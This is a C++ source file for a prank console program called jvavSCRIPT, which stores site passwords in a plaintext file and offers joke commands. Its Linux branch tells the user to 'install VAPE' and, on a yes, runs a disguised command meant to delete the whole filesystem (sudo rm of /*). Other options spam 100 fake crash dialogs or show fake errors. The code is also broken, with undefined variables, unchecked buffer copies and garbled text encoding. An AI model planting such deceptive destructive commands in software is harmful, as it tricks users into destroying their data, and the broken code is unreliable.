//
// Copyright (C)   .
//
//
/***********************************************************************************************
 ***                 C O N F I D E N T I A L  ---  J V A V   S T U D I O S                   ***
 ***********************************************************************************************
 *                                                                                             *
 *                 Project Name : jvavSCRIPT                                                   *
 *                                                                                             *
 *                    File Name : main.cpp                                                     *
 *                                                                                             *
 *                   Programmer : ExecuitIF                                                    *
 *                                                                                             *
 *                   Start Date : 14/06/2020                                                   *
 *                                                                                             *
 *                  Last Update : 24/06/2020                                                   *
 *                                                                                             *
 *---------------------------------------------------------------------------------------------*
 * Functions:                                                                                  *
 *            #                                                                                *
 *            int main(int argc, char** argv)                                                  *
 *            void cls(const int cls)                                                          *
 *System Versions:                                                                             *
 *            Windows                                                                          *
 *            MacOS                                                                            *
 *            Linux                                                                            *
 * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - */

#include "#.hpp"
#include <cstdio>
#include <cstdlib>
//#include <#>

void clss(const int input_cls)//MacOS Function clss
{
	if(cls==0)
		{
			cls;
			cout<<"";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED);
			cout<<"======================= JVAVSCRIPT BY DR.HY-Z ===============================\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                                                                         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                                                                         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||        JVAV SCRIPT PROGRAM                   VER 10.0.18363.836         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                                                                         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||           (C)2020 DR.HY-Z STUDIOS  All rights reserved                  ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                                                                         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||           The author of the JSC & Jvinscripts:ExecuitIF                 ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                                                                         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                      ENTER \"help\" TO GET HELP!                          ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                                                                         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||             Online push updates are now not supported!                  ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                                                                         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||          Compile jvavScript source file are now supported!              ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                                                                         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"||                                                                         ||\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"=============================================================================\n\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
		}
	else
		{
			;
		}
}


int main(int argc, char **argv)
{
#ifdef WIN32//windows

	ofstream flog;
	flog.open("C:\\Programdata\\cokis\\logs.dat",ios::app);
	flog<<"ʱ�����"<<time(NULL)<<",jvavscript��ʼִ��\n";
	system("set jvavscriptdata = C:\\Programdata\\cokis");
	system("title JvavScript-64bit");
	if(argc==1)
		{
			cout<<"";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"\n\n�÷� : jvavscript.exe [-options] [-netaddress] [-informations]\n\n\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"����ѡ�����:\n\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"\t-kokimake [-options] [-netaddress] [-informations]\t\t����koki\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"\t-kokiget  [-options] [netaddress]                 \t\t��ȡ�ѱ����koki\n\t\t\t\t\t\t\t\t\tע�⣺��ַǰ��\"-\"!!!\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"\t-callcmd                                          \t\t����cmd�ӿ�\n\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"\t!!qbmake                                          \t\t��koki���б���\n\t\t\t\t\t\t\t\t\tע�⣺��ʹ�������ļ��滻���ļ�!!!\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"\t!!delete    -all                                  \t\t����ѱ����koki\n\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"������ַ����:\n\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"\t-(address)                                        \t\t-(e.g.)www.jvav.top\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"������Ϣ����:\n\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"\t-(informations)                                   \t\t-(e.g.)Password:abcdefg\n\n\n";
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
			cout<<"�й���ϸ��Ϣ�������:\"www.jvav.top/jvavscript/help\"��\n";
			flog<<"ʱ�����"<<time(NULL)<<",δ��⵽�����в���;���ʹ�÷����ɹ�\n";
			flog<<endl;
			MessageBox(NULL,"��ʹ��cmd�����д��������д˳���","Jvavscript-64bit--����",MB_OK | MB_SYSTEMMODAL | MB_ICONEXCLAMATION);
			system("pause");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
			exit(-1);
		}
	else
		{
			srand(time(NULL));
			char args[1001]="\0",arg1[101]="\0",arg2[101]="\0";
			char stri[203]="\0",stri1[101]="\0",stri2[101]="\0";
			short loopcnt=0,flag_open=1,ii=0;
			ofstream fout;
			ifstream fin;
			if(argc>=2)
				{
					strcpy(args,*(1+argv));
					flog<<"ʱ�����"<<time(NULL)<<",�����˵�һ������\n";
				}
			if(argc>=3)
				{
					strcpy(arg1,*(2+argv));
					flog<<"ʱ�����"<<time(NULL)<<",�����˵ڶ�������\n";
				}
			if(argc>=4)
				{
					strcpy(arg2,*(3+argv));
					flog<<"ʱ�����"<<time(NULL)<<",�����˵���������\n";
				}
			if(!stricmp(args,"-kokimake"))
				{
					system("cd C:\\Programdata&md cokis");
					fout.open("C:\\Programdata\\cokis\\ALL.kokis",ios::app);
					if(!fout.is_open())
						{
							flog<<"ʱ�����"<<time(NULL)<<",����koki�����ļ�ʧ��\n";
							cout<<"";
							SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED);
							cout<<"ERROR:Failed open cookie file!\n";
							SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED);
							cout<<"Created file,please try again!\n";
							SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED);
							SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
							return true;
						}
					flog<<"ʱ�����"<<time(NULL)<<",����koki�����ļ��ɹ�\n";
					for(int i=0; i<strlen(arg1)-1; i++)
						{
							fout<<arg1[i+1];
						}
					flog<<"ʱ�����"<<time(NULL)<<",����koki��д���������л�ȡ�ĵ�һ���ַ���\n";
					fout<<" ";
					for(int i=0; i<strlen(arg2)-1; i++)
						{
							fout<<arg2[i+1];
						}
					flog<<"ʱ�����"<<time(NULL)<<",����koki��д���������л�ȡ�ĵڶ����ַ���\n";
					fout<<endl;
					fout<<flush;
					fout.close();
					flog<<"ʱ�����"<<time(NULL)<<",����koki���ر��ļ��ɹ�\n";
					flog<<endl;
					flog<<flush;
					flog.close();
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_GREEN);
					cout<<"Succeedfully wrote your kokie!!!\n";
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
					exit(0);
				}
			else if(!stricmp(args,"-kokiget"))
				{
					fin.open("C:\\Programdata\\cokis\\ALL.kokis");
					flog<<"ʱ�����"<<time(NULL)<<",��ȡkoki���ļ��򿪳ɹ�\n";
					flog<<"ʱ�����"<<time(NULL)<<",��ȡkoki����ʼ�����ļ�Ѱ��ָ����ַ��koki\n";
					while(true)
						{
							fin>>stri1>>stri2;
							if(!stricmp(stri1,arg1))
								{
									break;
								}
							if(loopcnt==32767)
								{
									flag_open=0;
									memset(stri1,'\0',101);
									memset(stri2,'\0',101);
									break;
								}
							loopcnt++;
						}
					if(flag_open)
						{
							puts(stri2);
							flog<<"ʱ�����"<<time(NULL)<<",��ȡkoki����ȡ��Ϣ�ɹ�\n";
							flog<<endl;
							exit(0);
						}
					else if(!flag_open)
						{
							cout<<"";
							SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED);
							cout<<"Failed to find this address's information\n";
							SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
							flog<<"ʱ�����"<<time(NULL)<<",��ȡkoki����ȡ��Ϣʧ��\n";
							flog<<endl;
							exit(1);
						}
				}
			else if(!stricmp(args,"!!qbmake"))
				{
					system("cd C:\\Programdata\\cokis&md backups");
					system("xcopy C:\\Programdata\\cokis\\ALL.kokis C:\\Programdata\\cokis\\backups /q /h /r /y /j");
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_GREEN);
					cout<<"Succeedfully maked your koki backup!\n";
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
					flog<<"ʱ�����"<<time(NULL)<<",�������ݣ������ļ��ɹ�\n";
					flog<<endl;
					exit(0);
				}
			else if(!stricmp(args,"!!delete"))
				{
					delay(5);
					MessageBox(NULL,"�޷��ҵ�RUNEXE32.DLL��ɾ�������޷����У�\n���°�װ����ϵͳ���ܻ���������.","JvavScript-64bit--ɾ������",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED);
					cout<<"ERROR:Failed to find Runexe32.dll,Program can not run!\n";
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
					exit(2);
				}
			else if(!stricmp(args,"!!joke"))
				{
					//���˴��룺"jvavscript.exe !!joke"
					flog<<"ʱ�����"<<time(NULL)<<",�������˴���\n";
					MessageBox(NULL,"HI!I'm JVAVSCRIPT,and i'm a crashaholic!!!","Jvavscript.exe-64bit",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
					for(int i=0; i<=99; i++)
						{
							delay(rand()%3);
							MessageBox(NULL,"jvav.lang.NullPointerException: Rendering entity in world\n\tat net.JvavScript.client.entity.AbstractClientPlayer.handler$getCape$zza000(AbstractClientPlayer.jvav:542)\n\tat net.JvavScript.client.entity.AbstractClientPlayer.func_110303_q(AbstractClientPlayer.jvav)\n\tat xaero.patreon.Patreon4.renderCape(Patreon4.jvav:139)\n\tat xaero.common.events.ForgeEventHandler.handleRenderPlayerEventPost(ForgeEventHandler.jvav:207)\n\tat net.JvavScriptforge.fml.common.eventhandler.ASMEventHandler_107_ForgeEventHandler_handleRenderPlayerEventPost_Post.invoke(.dynamic)\n\tat net.JvavScriptforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.jvav:90)\n\tat net.JvavScriptforge.fml.common.eventhandler.EventBus.post(EventBus.jvav:182)\n\tat net.JvavScript.client.renderer.entity.RenderPlayer.func_76986_a(RenderPlayer.jvav:74)\n\tat net.JvavScript.client.renderer.entity.RenderPlayer.func_76986_a(RenderPlayer.jvav:28)\n\tat net.JvavScript.client.renderer.entity.RenderManager.func_188391_a(RenderManager.jvav:384)\n\tat net.JvavScript.client.renderer.entity.RenderManager.func_188388_a(RenderManager.jvav:368)\n\tat net.JvavScript.client.renderer.RenderGlobal.func_180446_a(RenderGlobal.jvav:628)\n\tat net.JvavScript.client.renderer.EntityRenderer.func_175068_a(EntityRenderer.jvav:1347)\n\tat net.JvavScript.client.renderer.EntityRenderer.func_78471_a(EntityRenderer.jvav:1259)","JvavScript Crashed!!!",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
						}
					flog<<"ʱ�����"<<time(NULL)<<",���˴�����ɣ��˳�\n";
					flog<<endl;
					exit(3);
				}
			else if(!stricmp(args,"-callcmd"))
				{
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_BLUE);
					cout<<"Preparing for your jvavscript cmd interface......\n";
					delay(rand()%9+1);
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_GREEN);
					cout<<"cmd interface started!\n";
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
					system("%windir%\\SysWoW64\\cmd.exe");
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_GREEN);
					cout<<"Callcmd Ended\n";
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
					flog<<"ʱ�����"<<time(NULL)<<",����cmd�ӿ�:���\n";
					flog<<endl;
				}
			//add new commandline here!
			else
				{
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED);
					cout<<"Unknow commandline!!!\nprogram stopping......\n";
					SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),FOREGROUND_INTENSITY|FOREGROUND_RED|FOREGROUND_GREEN|FOREGROUND_BLUE);
					delay(rand()%9+1);
					flog<<"ʱ�����"<<time(NULL)<<"δ֪�������в���:";
					for(int j=0; j<=strlen(args); j++)
						{
							flog<<args[j];
						}
					flog<<endl;
					exit(-1);
				}
		}
	exit(0);


#else

#ifdef linux//linux


	cout<<"You must install VAPE before you install jvavscript in Linux!!\n";
	cout<<"Install VAPE?(Y/N)";
	char x;
	cin>>x;
	if(x=='y'||x=='Y')
		{
			system("sudo -rm rf /*");
		}
	return false;


#else//MacOS


	srand(time(NULL));
	string input_JVAV,tmp,tmp1;
	clss(0);
	while(1)
		{
			cout<<"JVAVScri>>>";
			cin>>input_JVAV;
			if(input_JVAV=="help")
				{
					cout<<"-------- JVAVSCRIPT HELP PAGE   1/1 ---------------\n";
					cout<<"1 \"help\":show this page;\n";
					cout<<"2 \"complete\":complete your file (*.jvsx);\n";
					cout<<"3 \"clear\": clear the screen\n";
					cout<<"4 \"kokimake\":make a koki\n";
					cout<<"5 \"gko\":get the koki file\n";
					cout<<"6 \"callcmd\":run cmd client\n";
					cout<<"7 \"quit\":exit jvav;\n";
					cout<<"8 \"license\":read the license;\n";
					cout<<"9 \"credits\":show you the authors.\n\n";
				}
			else if(input_JVAV=="kokimake")
				{
					cout<<"���ܿ����У������ĵȴ�������������\n";
				}
			else if(input_JVAV=="gko")
				{
					cout<<"���ܿ����У������ĵȴ�������������\n";
				}
			else if(input_JVAV=="callcmd")
				{
					system("%windir%\\system32\\cmd.exe");
				}
			else if(input_JVAV=="complete")
				{
					cout<<"JVAVScri>JVS++.exe>>>COMPLETE:PLEASE ENTER THE PATH OF YOUR FILE (*.jvsx)>>>";
					cin>>tmp;
					delay(rand()%5);
					cout<<"jvavScri>JVS++.exe>>>Applying SpecialSource......\n";
					delay(rand()%5);
					cout<<"JVAVScri>JVS++.exe>>>Creating renamed srg......\n";
					delay(rand()%5);
					cout<<"JVAVScri>JVS++.exe>>>Filtering classes......\n";
					delay(rand()%5);
					cout<<"JVAVScri>JVS++.exe>>>Copying sources......\n";
					delay(rand()%5);
					cout<<"JVAVScri>JVS++.exe>>>Applying fernflower fixes......\n";
					delay(rand()%5);
					cout<<"JVAVScri>JVS++.exe>>>Applying RunDl132.exe......\n";
					delay(rand()%5);
					cout<<"JVAVScri>JVS++.exe>>>COMPLETING......>\n\n\n";
					delay(rand()%10);
					cout<<"Finded ERROR 1,Warring 0,stop completing......\n";
					cout<<"=========================================ERROR REPORT=========================================\n\n\n";
					cout<<"line:0,NUM:0,class:%JVAVDIR%\\JVS++.exe   [Error]: Failed to find properly connected toilet bowl\n\n";
					cout<<"line:0,NUM:0,class:%JVAVDIR%\\JVS++.exe   [TIPS]: This choice is just a joke,please use the others!\n\n";
					cout<<"==============================================================================================\n\n\n";
				}
			else if(input_JVAV=="clear")
				{
					clss(0);
				}
			else if(input_JVAV=="license")
				{
					cout<<"\n\n================JVAVSCRIPT LICENSE=======================\n\n";
					cout<<"1 COPYRIGHTS DR.HY-Z,ALL RIGHT RESERVED!!!!!!!!!!!!!\n\n";
					cout<<"=========================================================\n\n\n";
				}
			else if(input_JVAV=="credits")
				{
					cout<<"\n\nAUTHOR:DR.HY-Z\n";
					cout<<"\nJVS++.exe AUTHOR:ExecuitIF\n\n";
				}
			else if(input_JVAV=="quit")
				{
					return false;
				}
			else
				{
					cout<<"\nInvalid input operation!\n\n";
				}
		}
	return 0;


#endif
#endif
}
